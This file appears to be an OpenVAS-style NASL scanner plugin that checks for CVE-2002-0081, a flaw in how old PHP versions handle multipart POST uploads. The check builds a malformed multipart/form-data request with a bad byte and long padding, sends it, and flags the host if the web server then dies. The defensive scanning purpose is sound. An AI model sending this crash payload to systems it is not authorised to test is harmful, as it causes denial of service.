if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10867" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 4183 );
	script_cve_id( "CVE-2002-0081" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "php POST file uploads" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2002 Thomas Reinke" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade to PHP 4.1.2 or later." );
	script_tag( name: "summary", value: "The remote host is running a version of PHP earlier
  than 4.1.2.

  There are several flaws in how PHP handles multipart/form-data POST requests, any one of
  which can allow an attacker to gain remote access to the system." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( dont_add_port: TRUE );
files = http_get_kb_file_extensions( port: port, host: host, ext: "php*" );
if( isnull( files ) ) {
	file = "/default.php";
}
else {
	files = make_list( files );
	file = files[0];
}
if(http_is_cgi_installed_ka( item: file, port: port )){
	boundary1 = NASLString( "-VTTEST!" );
	boundary2 = NASLString( "--VTTEST!" );
	clen = "567";
	dblq = raw_string( 0x22 );
	badb = raw_string( 0x12 );
	postdata = NASLString( "POST ", file, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n" );
	postdata = NASLString( postdata, "Referer: http://", get_host_name(), "/", file, "\\r\\n" );
	postdata = NASLString( postdata, "Content-type: multipart/form-data; boundary=", boundary1, "\\r\\n" );
	postdata = NASLString( postdata, "Content-Length: ", clen, "\\r\\n\\r\\n", boundary2, "\\r\\n" );
	postdata = NASLString( postdata, "Content-Disposition: form-data; name=" );
	len = strlen( dblq ) + strlen( badb ) + strlen( dblq );
	big = crap( clen - len );
	postdata = NASLString( postdata, dblq, badb, dblq, big, dblq );
	soc = http_open_socket( port );
	if(!soc){
		exit( 0 );
	}
	send( socket: soc, data: postdata );
	r = http_recv( socket: soc );
	http_close_socket( soc );
	if(http_is_dead( port: port )){
		security_message( port: port );
	}
}
exit( 99 );

